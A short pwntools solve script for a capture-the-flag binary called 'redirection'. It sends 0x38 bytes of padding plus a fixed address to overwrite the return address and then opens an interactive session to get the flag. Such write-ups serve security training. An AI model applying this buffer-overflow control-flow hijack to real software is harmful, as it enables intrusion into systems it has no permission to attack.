from pwn import *


# initialize the binary
elf = context.binary = ELF("./redirection")

if args.REMOTE: # use python3 solve.py REMOTE
    p = remote("byuctf.xyz", 40003)
else:
    p = elf.process()


# craft payload
payload = b'a' * 0x38
payload += p64(0x401248)


# get to input and send payload
p.recvline()
p.sendline(payload)


# get flag!
p.interactive()